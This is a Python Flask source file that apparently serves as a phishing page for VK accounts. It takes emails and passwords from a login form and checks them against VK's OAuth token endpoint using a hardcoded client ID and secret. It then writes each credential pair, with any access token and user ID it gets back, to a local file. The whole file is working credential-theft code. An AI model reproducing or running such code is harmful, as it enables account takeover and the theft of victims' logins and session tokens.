from flask import Flask
from flask import render_template
from flask import request
from flask import redirect
import requests
import re

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login',methods=['GET','POST'])
def login():
    if request.method == 'POST':

        email = request.form['email']
        password = request.form['pass']
        url = f"https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username={email}&password={password}"
        response = requests.get(url).json()
        with open('login.txt','a') as f:
            try:
                if response["error"] == "invalid_client":
                    f.write(f"Email:{email}|Password:{password}|Status:error")
                    return redirect('/')
                elif response["error"] == "need_validation":
                    f.write(f"Email:{email}|Password:{password}|Status:need_validation")
                    return redirect('/')
            except KeyError:
                access_token = response["access_token"]
                user_id = response["user_id"]
                f.write(f"Email:{email}|Password:{password}|access_token:{access_token}|user_id:{user_id}")
                return redirect('/')


if __name__=="__main__":
    app.run(debug=True)
